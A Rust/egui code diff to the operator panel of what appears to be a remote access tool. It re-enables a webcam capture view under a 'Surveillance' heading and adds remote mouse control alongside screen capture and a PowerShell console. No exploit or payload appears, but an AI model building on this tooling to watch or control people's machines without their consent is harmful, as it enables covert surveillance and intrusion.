@@ -2,11 +2,11 @@ use core::f32;
 
 use crate::{manager::types::UiManagerCommand, ui::client::types::*};
 use egui::{
-    Button, CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, RadioButton,
-    RichText, ScrollArea, Slider, Stroke, TextEdit, TextStyle, TextureHandle, Ui, Widget, Window,
+    Button, CollapsingHeader, Color32, Context, Frame, Id, Margin, RichText, ScrollArea, Stroke,
+    TextEdit, TextStyle, Window,
 };
 use shared::commands::{
-    CaptureCommand, CaptureQuality, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
+    CaptureQuality, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
 };
 use tokio::sync::mpsc::UnboundedSender;
 
@@ -18,6 +18,7 @@ mod video;
 pub struct ClientViewState {
     pub visible: bool,
     pub powershell: PowerShellView,
+    pub input: ClientViewInputState,
     pub captures: ClientViewCaptures,
     pub textures: ClientViewTextures,
     pub capturing: ClientViewCaptureState,
@@ -45,6 +46,12 @@ impl ClientView {
             socket: socket,
             state: ClientViewState {
                 visible: false,
+                input: ClientViewInputState {
+                    active: false,
+                    clicking: false,
+                    last_update: None,
+                    last_position: None,
+                },
                 powershell: PowerShellView {
                     input: String::from("whoami"),
                     output: String::from("\n"),
@@ -80,29 +87,36 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
         .id(Id::new(&view.mutex)) // rely on the mutex in case connected devices share a hostname (for whatever reason)
         .open(&mut view.state.visible)
         .resizable(true)
+        .movable(!view.state.input.active) // don't move the window while we're giving verbal
         .show(ctx, |ui| {
             CollapsingHeader::new("🔍  Surveillance")
                 .default_open(true)
                 .show(ui, |ui| {
-                    //ui.horizontal(|ui| {
+                    ui.horizontal(|ui| {
 
-                        //ui.vertical(|ui| {
+                        ui.vertical(|ui| {
                         CollapsingHeader::new("🖵  Screen")
                             .default_open(false)
                             .show(ui, |ui| {
+                            ui.horizontal(|ui| {
+                                ui.checkbox(&mut view.state.input.active, "Control");
+                                if view.state.input.active { ui.label("  ⚠ Window position locked"); }
+                            });
                             video::render(
                                 ui,
                                 CaptureType::Screen,
                                 &view.mutex,
                                 &view.sender,
+                                &mut view.state.input,
                                 &mut view.state.captures.screen,
                                 &mut view.state.capturing.screen,
                                 &mut view.state.textures.screen,
                             );
                             });
-                        //});
+                        });
 
-                        /*ui.vertical(|ui| {
+
+                        ui.vertical(|ui| {
                             CollapsingHeader::new("📸  Camera")
                             .default_open(false)
                             .show(ui, |ui| {
@@ -111,14 +125,15 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                                 CaptureType::Camera,
                                 &view.mutex,
                                 &view.sender,
+                                &mut view.state.input,
                                 &mut view.state.captures.webcam,
                                 &mut view.state.capturing.webcam,
                                 &mut view.state.textures.webcam,
                             );
                             });
-                        });*/
+                        });
 
-                        //});
+                        });
                 });
             CollapsingHeader::new("🗁  Utility")
                 .default_open(true)
